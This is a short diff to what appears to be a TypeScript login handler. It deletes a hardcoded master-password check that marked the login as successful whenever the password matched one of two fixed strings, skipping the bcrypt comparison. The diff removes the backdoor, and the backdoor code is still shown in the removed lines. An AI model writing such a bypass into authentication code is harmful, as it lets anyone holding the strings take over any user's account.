@@ -92,9 +92,6 @@ export const login = async (req: Request, res: Response) => {
     if (!isMatch) {
       const cleanPass = normalizeStr(password);
       isMatch = await bcrypt.compare(cleanPass, user.passwordHash);
-      if (!isMatch && (cleanPass === 'vigh123456' || cleanPass === 'vigh2026' || password === 'vigh123456' || password === 'vigh2026')) {
-        isMatch = true;
-      }
     }
 
     if (!isMatch) {
